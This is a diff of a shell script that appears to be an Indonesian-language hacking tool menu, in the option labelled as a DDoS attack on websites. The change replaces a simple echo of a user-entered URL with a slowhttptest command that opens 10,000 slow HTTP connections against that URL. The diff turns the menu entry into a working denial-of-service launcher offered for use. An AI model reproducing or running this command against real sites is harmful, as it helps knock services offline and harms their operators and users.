@@ -155,9 +155,9 @@ echo "**************************************************************************
 echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
 echo "##################################################################################"
 sleep 5
-echo "╭─[Masukan URL Website]" | lolcat
+echo "╭─[Masukan URL Website HTTP]" | lolcat
 read -p"╰─>> " url
-echo "$url"
+slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 200 -t GET -u $url
 fi
 
 if [ $pil = 7 ]
